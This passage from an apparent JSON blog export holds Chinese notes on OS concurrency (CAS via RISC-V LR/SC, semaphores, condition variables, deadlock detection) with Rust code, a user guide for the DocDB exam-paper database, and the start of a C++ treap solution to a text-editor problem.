{\n    OCCUPIED.store(false, Ordering::Relaxed);\n}\n```\n\n其中 `compare_exchange` 的接口定义为：\n\n```rust\npub fn compare_exchange(\n    &self,\n    current: bool,\n    new: bool,\n    success: Ordering,\n    failure: Ordering,\n) -> Result<bool, bool>;\n```\n\n其功能为：如果原子变量当前值与 `current` 相同，则将其修改为 `new`，并返回 `Ok`。否则不进行修改，返回 `Err`。无论返回 `Ok` 还是 `Err`，其包裹的值均为该原子变量在操作之前的值\n\n`compare_exchange` 是原子操作\n\n在硬件层面，该操作对应的指令为 `cas rd, rs1, rs2, rs3` ，其意义为：将一个内存位置存放的值（地址保存在 `rs1`）与一个期待值（值保存在 `rs2`）进行比较，如果相同则将内存位置存放的值修改为 `rs3`。无论是否相同，都将执行该指令之前的这个内存位置存放的值写入寄存器 `rd` 中\n\n实际上 riscv 并不原生支持 CAS 指令。我们需要使用 LR 和 SC 指令进行模拟\n\n（1）LR：加载保留指令，用来加载一个地址处的数据到寄存器内，并在 CPU 内部维护一个保留集，将这个地址放到保留集中\n\n（2）SC：条件存储指令，一般和 LR 配套使用，如果目标地址存在于保留集中，那么就把指定数据写入到目标地址，否则不写入。指令执行完毕之后，会在一个寄存器中指出是否成功对目标地址进行了修改\n\n如果在 LR 和 SC 中间，对一个地址中的数据进行了修改，那么就把这个地址从保留集中移除。这样一来，只有 LR 和 SC 中间目标地址的数据没有被修改，SC 才会进行修改\n\n通过这两个指令可以实现 cas\n\n```assembly\n# 参数 a0 存放内存中的值的所在地址\n# 参数 a1 存放 expected\n# 参数 a2 存放 new\n# 返回值 a0 略有不同：这里若比较结果相同则返回 0 ，否则返回 1\n# 而不是返回 CAS 之前内存中的值\ncas:\n    lr.w t0, (a0) # LR 将值加载到 t0\n    bne t0, a1, fail # 如果值和 a1 中的 expected 不同，跳转到 fail\n    sc.w t0, a2, (a0) # SC 尝试将值修改为 a2 中的 new\n    bnez t0, cas # 如果 SC 的目标寄存器 t0 不为 0 ，说明 LR/SC 中间值被修改，重试\n    li a0, 0 # 成功，返回值为 0\n    ret # 返回\nfail:\n    li a0, 1 # 失败，返回值为 1\n    ret # 返回\n```\n\n大概可以理解为对目标地址的修改必须是连读带写一块完成的，如果写回的时候发现目标地址已经被修改过了，那么就重新来一次\n\n如果存在多个 CPU 同时执行原子指令，那么这些指令会被发送到 CPU 和 RAM 之间的总线上，总线会对这些请求进行排序，且只有排在最前面的那个指令会成功，后面的指令会失败\n\n### 让权等待\n\n显然直接忙等会让线程吃满当前时间片，这样做是不行的。我们可以在忙等的时候通过 yield 系统调用来主动让权。但是这样做有一些缺点：\n\n首先是这样做很大程度上受到操作系统调度策略的影响，让出去之后什么时候再回来就不好说了\n\n而且让权的过程中会产生上下文的切换，而上下文切换的开销很大，除了要保存和恢复寄存器之外，CPU 各类缓存，TLB 等都需要清空，这会破坏程序的时间和空间局部性，降低效率\n\n所以我们引入了堵塞和唤醒机制。当一个线程处于堵塞状态时，将该线程从调度队列中移除，内核在后续将不会调度该线程。这样就避免反复地调度然后又让出。同时将该线程加入到锁的唤醒队列中。直到锁被释放，锁释放的同时，唤醒队列中的一个线程（注意只能唤醒一个，因为唤醒后的瞬间线程进入临界区）。唤醒即为将这个线程重新加入到调度队列中。\n\n不过还有另一个方案，我们把自旋的过程放到内核里，就可以避免上下文切换的开销。具体来说，加锁的时候，内核会判断是否已经上锁，如果已经上锁了，就接着调度下一个线程，直到锁被释放。\n\n### 信号量机制\n\n信号量可以认为是锁的推广。信号量是一个值，其有两个操作：\n\nV 操作：将信号量的值加一\n\nP 操作：将信号量的值减一，如果减一之前信号量的值已经为 0 了，那么就堵塞，直到信号量的值为 1 之后再减一\n\n信号量可以解决如下问题：\n\n- 限制进入临界区的线程数量\n- 条件同步：我们先创建一个值为 0 的信号量。此时线程一先尝试进行 P 操作，堵塞。直到线程二进行了 V 操作，线程一才能继续执行下去。这样就可以做到条件同步\n- 生产者和消费者问题：有多个生产者和一个消费者，有一个容量有限的缓冲区。缓冲区满的时候生产者再生产就会堵塞。缓冲区空时消费者再消费就会堵塞（很像管道）。这容易使用信号量实现。不过注意的是需要两个信号量，一个记录可生产量，一个记录可消费量（因为一个信号量只能做到单边限制，此问题两边都有限制，需要两个信号量）\n\n### 条件变量机制\n\n感觉这个条件变量不太好理解\n\n条件变量是解决这样的一个问题：我们的线程需要一直堵塞，直到某个条件成立才继续执行。实际上上面的信号量已经做到了这一点，但是信号量的实现有一些不足：首先这个条件可能会比较复杂，涉及多个共享量。某个线程更新了一个共享值之后未必使得条件一定成立。可能有多个线程都在等待这个条件，信号量实现会比较复杂。\n\n于是就产生了条件变量。条件变量主要有两个操作：\n\n等待条件变量：把当前线程堵塞，加入到该条件变量的唤醒队列中\n\n唤醒条件变量：把条件变量唤醒队列中的一个线程进行唤醒\n\n条件变量主要和 mutex 一块使用，大体流程是：为了判断一个条件是否成立，我先拿锁，然后判断，然后释放锁。如果条件不满足，那么我就堵塞（这里是因为条件变量而堵塞）。于此同时，另一个线程拿锁，修改条件，释放锁，然后唤醒一个因条件变量而堵塞的线程。当一个线程被唤醒后，再次重复拿锁，判断...这些过程。之所以唤醒后又重复判断，是因为我们需要考虑多个线程等待条件的时候，有的线程不是条件更改后立刻被唤醒，可能被唤醒之前条件又被先前唤醒的线程更改了。而且唤醒可能不意味着一个复杂条件的成立。\n\n（这里先释放锁再唤醒和先唤醒再释放锁应该没什么区别吧）\n\n不过具体实现中，条件变量在等待的时候需要传入一个 mutex。`condvar_wait` 执行的时候，先释放锁，然后挂起当前线程，等线程被唤醒之后，再拿锁。这样再次循环判断的时候仍是正常处于临界区。\n\n```rust\npub fn signal(&self) {\n    let mut inner = self.inner.exclusive_access();\n    if let Some(task) = inner.wait_queue.pop_front() {\n        wakeup_task(task);\n    }\n}\n\npub fn wait(&self, mutex: Arc<dyn Mutex>) {\n    mutex.unlock();\n    let mut inner = self.inner.exclusive_access();\n    inner.wait_queue.push_back(current_task().unwrap());\n    drop(inner);\n    block_current_and_run_next();\n    mutex.lock();\n}\n```\n\n比如：\n\n```rust\nconst CONDVAR_ID: usize = 0;\nconst MUTEX_ID: usize = 0;\n\nunsafe fn first() -> ! {\n    sleep(10);\n    println!(\"First work, Change A --> 1 and wakeup Second\");\n    mutex_lock(MUTEX_ID);\n    A = 1;\n    condvar_signal(CONDVAR_ID);\n    mutex_unlock(MUTEX_ID);\n    exit(0)\n}\n\nunsafe fn second() -> ! {\n    println!(\"Second want to continue,but need to wait A=1\");\n    mutex_lock(MUTEX_ID);\n    while A == 0 {\n        println!(\"Second: A is {}\", A);\n        condvar_wait(CONDVAR_ID, MUTEX_ID);\n    }\n    println!(\"A is {}, Second can work now\", A);\n    mutex_unlock(MUTEX_ID);\n    exit(0)\n}\n\n#[no_mangle]\npub fn main() -> i32 {\n    // create condvar & mutex\n    assert_eq!(condvar_create() as usize, CONDVAR_ID);\n    assert_eq!(mutex_blocking_create() as usize, MUTEX_ID);\n    ...\n}\n```\n\nfirst 在条件变量修改完毕之后释放锁，并通知 second 是时候唤醒了\n\nsecond 中，他先拿锁，然后判断，如果不满足条件，就执行condvar_wait，在 condvar_wait 中，先把锁释放（我都判断完了就没必要拿着锁了），然后堵塞直到被唤醒，当再被唤醒的时候，再拿锁，然后 condvar_wait 结束，再次循环判断（我们发现 condvar_wait 把释放锁和拿锁的过程包装了起来，使得执行前后锁的状态不变）\n\n条件变量还有个问题是同步屏障问题，如\n\n```rust\nfn thread_fn() {\n    for _ in 0..300 { print!(\"a\"); }\n    for _ in 0..300 { print!(\"b\"); }\n    for _ in 0..300 { print!(\"c\"); }\n    exit(0)\n}\n```\n\n我们希望在所有线程打印完 a 之后，再一块打印 b。b，c 同理\n\n使用条件变量做法：\n\n```rust\nconst THREAD_NUM: usize = 3;\n\nstruct Barrier {\n    mutex_id: usize,\n    condvar_id: usize,\n    count: UnsafeCell<usize>,\n}\n\nimpl Barrier {\n    pub fn new() -> Self {\n        Self {\n            mutex_id: mutex_create() as usize,\n            condvar_id: condvar_create() as usize,\n            count: UnsafeCell::new(0),\n        }\n    }\n    pub fn block(&self) {\n        mutex_lock(self.mutex_id);\n        let count = self.count.get();\n        // SAFETY: Here, the accesses of the count is in the\n        // critical section protected by the mutex.\n        unsafe { *count = *count + 1; }\n        if unsafe { *count } == THREAD_NUM {\n            condvar_signal(self.condvar_id);\n        } else {\n            condvar_wait(self.condvar_id, self.mutex_id);\n            condvar_signal(self.condvar_id);\n        }\n        mutex_unlock(self.mutex_id);\n    }\n}\n\nunsafe impl Sync for Barrier {}\n\nlazy_static! {\n    static ref BARRIER_AB: Barrier = Barrier::new();\n    static ref BARRIER_BC: Barrier = Barrier::new();\n}\n\nfn thread_fn() {\n    for _ in 0..300 { print!(\"a\"); }\n    BARRIER_AB.block();\n    for _ in 0..300 { print!(\"b\"); }\n    BARRIER_BC.block();\n    for _ in 0..300 { print!(\"c\"); }\n    exit(0)\n}\n```\n\n首先拿锁，然后进行判断和修改。如果条件已经成立，那么唤醒一个线程。如果条件不成立，那么就堵塞，当堵塞结束之后，说明条件成立了（在这个场景下我们在堵塞结束后不需要再次判断条件是否仍然成立了）线程继续执行。不同的是，线程继续执行的同时也唤醒其他线程。这样，最开始的线程由于判断条件成立从而被唤醒，这个线程又去唤醒其他线程，线程一个接着一个地被唤醒，形成了一个唤醒链条，从而所有线程都被唤醒\n\n### 并发中的问题\n\n- 读取变量的时候也要加锁\n\n```rust\nstatic mut A: usize = 0;\n//... other code\nunsafe fn thr1() -> ! {\n    if (A == 0) {\n      println!(\"thr1: A is Zero  --> {}\", A);\n    }\n    //... other code\n}\nunsafe fn thr2() -> ! {\n    A = A+1;\n    println!(\"thr2: A is One  --> {}\", A);\n}\n```\n\n看样子一个只写，一个只读，应该是没问题？但可能出现，判断 A 为 0 之后，发生中断，切换到 thr2 ，对 A 进行修改，再切回 thr1 的时候输出 `thr1: A is Zero  --> 1`\n\n- 同步缺陷\n\n```rust\nstatic mut A: usize = 0;\n...\nunsafe fn thr1() -> ! {\n   ...    //在某种情况下会休眠\n   A = 1;\n   ...\n}\nunsafe fn thr2() -> ! {\n   if A==1 {\n      println!(\"Correct\");\n   }else{\n      println!(\"Panic\");\n   }\n}\npub fn main() -> i32 {\n   let mut v = Vec::new();\n   v.push(thread_create(thr1 as usize, 0));\n   sleep(10);\n   ...\n   v.push(thread_create(thr2 as usize, 0));\n   ...\n}\n```\n\n上述代码能够确保一个线程先执行，一个线程后执行，会不会出问题？实际上虽然线程一率先执行，但有可能在 `A = 1;` 前被切换出去执行线程二了，此时就会出现问题。因此线程要想有优先顺序必然要使用同步原语\n\n### 死锁检测\n\n本章的实验给出了一个死锁检测的算法。在指导书中称此算法为银行家算法，不过群里的助教表示银行家算法的原型是不可实现的，实验中给出的算法并非完全的银行家算法，当然我看也有人表示就是一样的。我这里称这个算法为神秘算法吧\n\n这个神秘算法需要维护三个量\n\n- $Available_i=k$ 表示第 $i$ 类资源（如信号量，锁）的可用数量为 $k$ （锁的话要么为 0 要么为 1，信号量的话从 0 到 res_count 取值）\n- $Allocation_{t,i}=g$ 表示线程 $t$ 当前已经拿到了第 $i$ 类资源，拿到的数量为 $g$\n- $Need_{t,i}=d$ 表示线程 $t$ 还需要第 $i$ 类资源的数量为 $d$ （刚开始以为这个量需要线程提前告知，或者内核通过什么高科技手段解析线程的代码获取什么的。后来看群里讨论，这个 $Need$ 只需要在线程正在申请资源的时候加一，申请完毕（包括成功和失败）之后减一即可）\n\n每次要处理线程申请请求的时候根据如下算法判断是否会产生死锁。算法的过程如下：\n\n- 第一步\n\n设 $Work$ 为系统可分配给线程的资源数目，初始时 $Work=Available$。设 $Finish_t$ 表示这样分配完毕之后线程 $t$ 是否可以顺利执行完毕。初始时 $Finish_t=false$\n\n- 第二步\n\n从线程集合中寻找满足 $Finish_t=false$（即还没有拿到想要的资源，正在被堵塞），$Need_{t,i} \\le Work_i$ （即这个线程所需要的资源都可以被操作系统分配）的线程 $t$。如果找到，说明操作系统可以给这个线程分配资源，从而使得这个线程解除堵塞顺利执行完毕\n\n如果找到则继续，否则跳到第四步\n\n- 第三步\n\n令 $Finish_t=true$。线程能够运行结束并释放其资源，令 $Work_i+=Allocation_{t,i}$\n\n然后跳回第二步再次寻找\n\n- 第四步\n\n如果 $Finish$ 均为 $true$，那么系统处于安全状态（说明存在一个特定的执行顺序使得所有线程顺利执行完毕。具体方案则是第二步寻找出来的顺序），否则表示系统不安全，出现死锁，请求应该被拒绝。\n\n我们举几个例子判断一下该算法是否可以正常识别出死锁\n\n- 重复拿锁：拿完锁，还没释放，再次拿锁\n\n一个程序拿完锁之后，此时 $Available$ 为 $0$，然后又尝试拿锁，$Available$ 无法满足 $Need$ 的要求，因此请求被拒绝\n\n- 双线程互锁：线程一先申请锁一，再申请锁二。线程二先申请锁二，再申请锁一。当两个线程重叠执行的时候发生死锁\n\n线程一申请完锁一，线程二申请完锁二之后，$Available_1=Available=0$， 后面线程一再申请锁二的时候 $Available$ 无法满足 $Need$，请求被拒绝\n\n### 之前的疑惑\n\n这章结束之后，前面的一些疑惑就解决了：\n\n在文件系统这一章中开始大面积使用 Mutex 来实现内部可变性，而我之前一直好奇在没有操作系统的支撑下是如何做到互斥的。我们可以看到 Mutex 是在 spin 这个 crate 中的，不难猜出其内部大概率是忙等待，即自旋锁。并且应该是使用了类似 Peterson 的算法实现，或者是使用了原子指令操作\n\n在之前还好奇为什么在内核中实现内部可变性都是用 UPSafeCell 而不是使用 Mutex，反而实现文件系统的时候反过来了。现在明白，在内核中不会发生时钟中断，所以不会存在线程安全问题。不过应用程序进行的所有文件操作都是通过系统调用，又内核代理执行，而在内核态又不会发生时钟中断，所以对文件系统的操作都可以视为原子的，所以理论上文件系统使用 UPSafeCell 应该也没问题。只能推测使用 Mutex 是为了让文件系统能兼容多线程情况\n\n### 并发相关术语\n\n- 共享资源（shared resource）：不同的线程/进程都能访问的变量或数据结构。\n- 临界区（critical section）：访问共享资源的一段代码。\n- 竞态条件（race condition）：多个线程/进程都进入临界区时，都试图更新共享的数据结构，导致产生了不期望的结果。\n- 不确定性（indeterminate）： 多个线程/进程在执行过程中出现了竞态条件，导致执行结果取决于哪些线程在何时运行， 即执行结果不确定，而开发者期望得到的是确定的结果。\n- 互斥（mutual exclusion）：一种操作原语，能保证只有一个线程进入临界区，从而避免出现竞态，并产生确定的执行结果。\n- 原子性（atomic）：一系列操作要么全部完成，要么一个都没执行，不会看到中间状态。在数据库领域， 具有原子性的一系列操作称为事务（transaction）。\n- 同步（synchronization）：多个并发执行的进程/线程在一些关键点上需要互相等待，这种相互制约的等待称为进程/线程同步。\n- 死锁（dead lock）：一个线程/进程集合里面的每个线程/进程都在等待只能由这个集合中的其他一个线程/进程 （包括他自身）才能引发的事件，这种情况就是死锁。\n- 饥饿（hungry）：指一个可运行的线程/进程尽管能继续执行，但由于操作系统的调度而被无限期地忽视，导致不能执行的情况。\n\n### read/write_volatile\n\n编译器可能会对代码的内存读写操作进行优化（删除或者重排），比如写一个地址然后立刻读一个地址，编译器可能认为读这个地址一定会是前面写入的那个值，于是就把读入操作优化。但有的时候，如 I/O 外设以 MMIO 方式映射设备寄存器时，相同内存位置进行读取和写入的意义可能完全不一样，此时编译器的优化就是错误的\n\n使用 volatile 则可保证读写不会被编译器优化\n\n","summary":"作者记录了参加Rust训练营的学习历程，从环境搭建、Rust基础到操作系统内核开发，包括特权级切换、多任务调度、虚拟内存、进程管理和文件系统等核心内容，最终完成并发编程实验。","key":["os"],"tags":[],"path":["os","2025春操作系统训练营游记（一二阶段）.md"],"background":"https://pic.caiwen.work/i/2025/05/02/68148c4fc1959.png","recommend":true,"status":"published"},{"type":"Article","title":"DocDB食用指南","id":"docdb","createTime":"2025-04-03T07:56:33.077Z","updateTime":"2025-09-05T13:34:05.220Z","content":"\nDocDB（Documents Database（非常直接的名称，可能后续还会考虑改名（bushi）) 的目的是让资料的整理归档更加科学且有条理，并且让查找试卷的过程更加快速\n\n## 试卷搜索\n\n### 概览\n\n点开 DocDB 的后，默认是搜索页面\n\n![搜索页面](http://pic.caiwen.work/i/2025/04/03/67ee12bbf12d5.png)\n\n在右上角的文本框中输入要查询试卷的课程名称的关键字后，如果存在对应的课程，那么右侧会有显示\n\n![输入关键字后](http://pic.caiwen.work/i/2025/04/03/67ee161281832.png)\n\n同时我们可以勾选中间的复选框，筛选是期中试卷还是期末试卷还是其他类型的试卷\n\n然后我们可以选中顾客需要的课程（可选多个），然后左边就会得到符合所有筛选条件的试卷信息\n\n![选中科目之后](http://pic.caiwen.work/i/2025/04/03/67ee171084594.png)\n\n### 标签\n\n有些课程可能还会有更多的类型，比如高等数学就分 A1、A2、B1、B2，此时我们在选中课程名称之后，下方还会多显示一些标签\n\n![输入关键字并选中课程之后](http://pic.caiwen.work/i/2025/04/03/67ee18731712b.png)\n\n我们选中标签之后左侧就会出现对应的试卷了\n\n![选中标签之后](http://pic.caiwen.work/i/2025/04/03/67ee19890fb2f.png)\n\n有的试卷存在多个标签，如高数A2的机考试卷，存在“机考”和“A2”这两个标签，你需要把这两个标签都勾选上，才能看到对应的试卷信息\n\n![](http://pic.caiwen.work/i/2025/04/03/67ee1a171ff0c.png)\n\n有的课程，如“有机化学”，有些试卷不存在标签，有的试卷存在标签。如果我们只勾选上课程名称，不勾选任何标签的话，左侧就会先列出没有加标签的试卷。进一步勾选标签会显示更多的试卷\n\n![什么标签也不勾选](http://pic.caiwen.work/i/2025/04/03/67ee1af57764c.png)\n\n![勾选上标签“B”，左侧会多出来带标签“B”的试卷](http://pic.caiwen.work/i/2025/04/03/67ee1c0b2b111.png)\n\n::: info 为什么同一课程会出现有标签的试卷和没有标签的试卷？\n\n拿上面所说的“有机化学”课程举例，有些没有加标签的试卷大概是如下原因：\n\n- 整理试卷时无法判定这个试卷到底是无机化学A还是无机化学B的。如果你能辨别出来，请联系资料部成员\n\n- 还有的课程可能有时候分AB，有时候不分AB？\n  :::\n\n。\n\n::: warn 别忘了\n\n你选完课程名称之后，那些无标签的试卷就显示出来了，此时你直接问顾客要哪些的话，大概率会漏掉那些有标签的试卷\n\n所以别忘记把后面的标签也选上\n:::\n\n### 搜索结果显示\n\n左侧显示的搜索结果是按照年份从近到远的顺序给出的。如果存在未知年份，那么未知年份的试卷会显示在最上方。\n\n::: success 看到这就可以了\n\n在新版本的 DocDB 中，左侧列表的试卷都是按时间顺序排序了，下文的内容已经过时了。\n\n:::\n\n同时搜索结果中相同课程名称的试卷是挨在一块的。比如：\n\n![](http://pic.caiwen.work/i/2025/04/03/67ee21b9c0e46.png)\n\n先显示“普通物理”的试卷，按照年份从近到远。再显示“大学物理”的试卷，按照年份从近到远。\n\n### 预览\n\n有时候顾客不确定试卷的内容，你可能需要先让顾客看一下试卷的内容。直接双击左侧出现的试卷即可\n\n### 其他注意事项\n\n- 你只有输入了试卷的关键字，并勾选相应的试卷类型（期末、期中、其他），才会显示课程名称的列表。你只有选择了相应的课程名称，才会显示标签（如果该课程的试卷存在标签）。你只有选择了相应的标签，左侧才会出现相应的试卷信息（无标签的试卷除外）\n\n- 关于机考：由于现在湖大不公布机考题目了，所以整理的试卷中的机考题目都是上古时代的了。现在按照惯例，如果顾客就想来打印机考题目，那么就给他打印按知识点分类的机考题目。机考的试卷类型为”其他“，别忘了勾选。同时机考的试卷一般都有两个标签，也别忘勾选。\n\n![按知识点整理的机考题库。但记住题目依然是上古的（可能需要提醒顾客），不过也不失参考价值](http://pic.caiwen.work/i/2025/04/03/67ee247aaff89.png)\n\n- 由于现在的试卷整理时，试卷的课程名称是严格与试卷卷头一致的，这导致一些课程名称“反复横跳”的课程在搜索时需要注意，如：\n  - “大物”这个我们口头习惯上说的名称实际上表示了两个课程“普通物理”和“大学物理”。所以搜索的时候不应该直接搜“大物”，而是搜索“物理”，然后把“大学物理”和“普通物理”勾上\n\n  - “概率论”同理，搜索时建议先搜”概率“，然后选”概率统计“和”概率论与数理统计“。你反而不要选”概率论“，具体原因后面会说\n\n- 善于利用课程代码，有的课程可能不同专业学的不一样，但是叫一个名称。比如”概率论“这个课程，你不要以为是你认为的那个概率论。你搜索的话会得到课程编号为”MA“开头的试卷，这其实是数学专业的课程。\n\n## 试卷取回\n\n现在我们搜索到我们想要的试卷了，是时候给顾客打印出来了\n\n### 试卷勾选\n\n点击搜索界面的左侧的试卷即可勾选（不一定要点击左上角那个勾选框，整个区域都可以点）\n\n![](http://pic.caiwen.work/i/2025/04/03/67ee27bba7f5c.gif)\n\n也可以直接框选\n\n![](http://pic.caiwen.work/i/2025/04/03/67ee282f91115.gif)\n\n同时按下 Ctrl + A 键可以直接全选。如果已经全选了就会变为全不选\n\n![](http://pic.caiwen.work/i/2025/04/03/67ee28ad9a808.gif)\n\n勾选后的试卷会保持勾选。这意味着你在勾选完毕之后，还可以切换为其他关键字，或者筛选条件，再勾选别的试卷\n\n所有勾选后的试卷可以在“勾选界面”看到，点击最左侧第四个按钮即可切换到勾选界面\n\n![在这个动画中，先选中一个科目，然后取消选中再选另一个科目，这是没必要的。我们只是为了演示勾选后的试卷会保持勾选。你可以直接把两个科目都给勾选上](http://pic.caiwen.work/i/2025/04/03/67ee29de1ed3d.gif)\n\n在勾选界面中，你仍然可以更改勾选状态。但在这个界面里你只能一个一个点了（或许以后会支持快捷键和框选）。同时，你取消勾选的试卷仍然显示在这个界面，但你切换到别的界面后再跳回勾选界面后，取消勾选的试卷就不再显示了\n\n![](http://pic.caiwen.work/i/2025/04/03/67ee2b55e2445.gif)\n\n::: warn 注意勾选数量\n\n在新版本的 DocDB 的左下角会显示当前勾选了几个试卷\n\n![](http://pic.caiwen.work/i/2025/04/05/67f0fe519596b.png)\n\n请确保每次再给新顾客勾选试卷之前，之前勾选的试卷都取消勾选（也就是左下角这个数字要为0），不然的话你就相当于给顾客多打印试卷了\n\n:::\n\n### 打印要求与价格计算\n\n在勾选界面会显示当前已选中的试卷的价格\n\n默认是以 黑白、双面、一份 计算\n\n同时你也可以调整每份试卷是彩印还是黑白，是单面还是双面，以及份数\n\n有时一个个去调整太麻烦了，如果你需要批量调整，那么可以点击上方的批量编辑。批量更改全部试卷的打印要求\n\n### 打印\n\n确定完打印要求无误后，点击右上角的”取回“按钮，程序会将你选中的试卷打包为一个单独的pdf，并自动打开，然后根据提示框的要求，选用**黑白**打印机，**双面**打印\n\n![](http://pic.caiwen.work/i/2025/04/03/67ee2ddc6dc3c.png)\n\n::: warn 一律使用双面打印\n\n程序将会自动根据你在勾选页面中设置的打印要求调整打包出来的pdf。具体来说：\n\n- 如果某个试卷设置为单面打印，那么程序将会自动给试卷的每一页后面插入空白页。\n\n- 如果存在一个奇数页的试卷要求双面打印，那么程序会自动给这个试卷最后插入空白页以凑为偶数\n\n- 如果试卷有多份，那么就复制试卷的页面\n\n因此你无需产生任何顾虑\n:::\n\n如果打包后的pdf没有自动打开，或者打开了但不小心关闭了，那么可以点击“重新打开文件”再打开一次\n\n如果你的试卷存在彩印，那么程序会先将需要黑白打印的试卷打包，并自动打开\n\n![点击“取回”按钮后](http://pic.caiwen.work/i/2025/04/03/67ee3071e73d5.png)\n\n按要求打印完毕之后，点击下一步，程序会继续打包需要彩印的试卷，并自动打开\n\n::: warn 直接打印？\n\n我们在之前讲到，搜索界面双击试卷即可打开，那么我们直接把文件打印出来不行吗？\n\n可以是可以，但并不建议，除非你故意要这么做\n\n首先如果顾客需要的试卷很多的话，你这样做就会很麻烦\n\n而且程序在将试卷打包的时候还干了如下两件事\n\n- 在试卷的顶部和中间自动加上打印社的水印\n\n- 在试卷的右下角加上试卷的ID编号，以及试卷的年份、课程名称等信息，以便于顾客后续整理\n\n而你直接打印的话并不会有这些\n\n:::\n\n试卷取回完毕之后，勾选界面的试卷将会自动取消勾选\n\n::: info 发生意外了？\n\n在测试过程中发生了这样的一种情况：选中“微机原理”的试卷后，取回，由于这台电脑上默认的 pdf 打开工具是 adobe，程序使用 adobe 打开打包好的 pdf 并打印，但打印到一半 adobe 报错，文件只打印了一半\n\n此时我们需要考虑使用 wps 打印，在 DocDB 的新版本中，试卷取回之后，对话框下方有一个“打开文件夹”的按钮\n\n![](http://pic.caiwen.work/i/2025/04/05/67f0f86fa827a.png)\n\n点击后就可以看到打包合并好的 pdf 所在的文件夹，文件夹里可能有多个文件，为了查找方便，我们点击上方的 \"修改日期\"，即可让文件夹中的文件按时间排序，**最新**的那个文件就是刚刚打包好的 pdf ，后面我们右键选择 wps 打开就好了\n\n![](http://pic.caiwen.work/i/2025/04/05/67f0f90b1dd77.png)\n\n:::\n\n### 快速取回\n\n大多情况下顾客都是 黑白，双面，一份 的。此时如果顾客只需要一个课程的试卷，那么我们可以稍微快捷一点\n\n在搜索界面勾选要打印的试卷，然后点击右键，会弹出一个菜单，点击“简单取回”，程序将会自动将**当前所有选中的试卷**按照 黑白、双面、一份 的要求进行打包，并自动计算价格\n\n![](http://pic.caiwen.work/i/2025/04/03/67ee33a8de676.gif)\n\n::: warn 注意是当前所有选中\n\n这意味着，你先前已经勾选的试卷也会被打包，即使由于你更改了筛选条件，这些试卷并没有出现在当前的搜索结果中\n:::\n\n## 试卷整理\n\n### 整理规范\n\nDocDB 中应只包含湖南大学课程的考试试卷。四六级，考研等试卷不应整理到这里面。其他学校的试卷不应被整理。非试卷，如一些知识点总结，ppt等不应被整理。一些来路不明的模拟题、老师自己整理的复习题不应被整理。\n\n整理的试卷应提前转换为pdf格式。\n\n试卷的年份应该为这个试卷被使用的年份。\n\n### 添加试卷\n\n::: warn 注意\n\n添加试卷之前要先搜一下要添加的试卷是否已经存在数据库中，已经存在了就不要添加了\n\n:::\n\n点击最左侧的第五个图标，就来到了添加界面\n\n将我们要添加的试卷的pdf文件直接拖入到程序的窗口。程序将自动根据文件的文件名提取可能的信息。\n\n![](http://pic.caiwen.work/i/2025/04/03/67ee36dc6169f.gif)\n\n你也可以一口气拖入多个文件。还可以拖入完一个再拖入一个\n\n然后按照要求填写相应的内容\n\n需要特别说明的是标签。试卷的标签分为两类：筛选标签和标志标签。\n\n筛选标签即为可以用来筛选试卷的标签，你在搜索试卷时需要勾选的标签就是筛选标签。一些课程类型，如\"A1\"、\"上\" 等都属于筛选标签。**筛选标签中的字母都应该大写**\n\n标志标签并没有筛选作用，只是用来补充这个试卷的信息。如 \"B卷\"、\"补考\"、\"xxx院\"\n\n确保所有的试卷信息都填写无误之后，点击右上角的”添加“按钮即可将试卷添加到数据库中。\n\n添加时程序会自动在数据库中查找可能和你要添加的试卷一样的试卷，并弹出对话框询问，注意永远不要让数据库中存在两个相同的试卷\n\n::: warn 事情往往没这么简单\n\n有时候你可能会发现数据库中确实已经存在了要添加的试卷，但是年份却不一致，比如同样的内容，数据库中标的是 2015 年，你拿到的文件的文件名上写的是 2021 年，此时你就要想办法去辨别哪个是真的了，数据库里的试卷的信息未必是真的\n\n:::\n\n### 删除、编辑\n\n在搜索界面选中要操作的试卷，点击右键即可进行删除或者编辑。特殊地，只有一个试卷被选中时才可以点击编辑按钮。\n\n需要特别注意的是，删除试卷的操作是不可逆的，请谨慎操作\n\n### 数据库同步\n\n当你对数据库进行操作，如添加试卷、更改试卷信息、删除试卷，你的操作会产生一个新的版本。比如，你在 14 号电脑上进行操作之后，你再去 23 号和 5 号电脑上打开 DocDB，会发现窗口的右下角有提示：\n\n![](http://pic.caiwen.work/i/2025/04/05/67f0fc858576d.png)\n\n**每个**电脑上都有一个数据库。出现这个提示则说明这台电脑上的数据库版本已经不是最新的了，此时我们需要更新。\n\n点击最左侧倒数第一个按钮，就会来到设置界面，然后点击“更新”就可以更新这台电脑的数据库到当前最新版本了\n\n","summary":"关于DocDB的使用教程","key":[],"tags":[],"path":["开发","项目","DocDB","DocDB食用指南.md"],"background":"http://pic.caiwen.work/i/2025/04/03/67ee3fd493099.png","recommend":false,"status":"published"},{"type":"Article","title":"平衡树","id":"pingheng_tree","createTime":"2025-03-03T11:59:03.463Z","updateTime":"2025-09-05T13:34:05.945Z","content":"\n## 题目\n\n### P4008 [NOI2003] 文本编辑器\n\nhttps://www.luogu.com.cn/problem/P4008\n\n**题目描述**\n\n实现一个文本编辑器，有如下操作：\n\n1. 将光标移动到某个位置\n2. 在光标后插入一个字符串\n3. 删除光标后若干字符\n4. 获取光标后若干字符\n5. 光标向前移动\n6. 光标向后移动\n\n**笔记**\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define il inline\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 1024*1024*2\nstruct FHQ{\n    int tot=0;\n    struct Node{int ls,rs,dat,siz;char val;} tree[_];\n    #define nt tree[k]\n    #define lt tree[tree[k].ls]\n    #define rt tree[tree[k].rs]\n    il void update(int k){nt.siz=1+lt.siz+rt.siz;}\n    il int create(char v){int k=++tot;nt.dat=rand(),nt.val=v,nt.siz=1;return tot;}\n    il int merge(int x,int y){\n        if(!x||!y) return x+y;\n        if(tree[x].dat<tree[y].dat) return tree[x].rs=merge(tree[x].rs,y),update(x),x;\n        else return tree[y].ls=merge(x,tree[y].ls),update(y),y;\n    }\n    void split(int k,int x,int &l,int &r){\n        if(!k) return l=r=0,void();\n        if(lt.siz+1<=x) l=k,split(nt.rs,x-lt.siz-1,nt.rs,r);\n        else r=k,split(nt.ls,x,l,nt.ls);\n        update(k);\n    }\n    void print(int k){// 中序遍历打印\n        if(k==0) return;\n        print(nt.ls);cout<<nt.val;print(nt.rs);\n    }\n} tree;\ninline void subtask(){\n    srand(time(NULL));\n  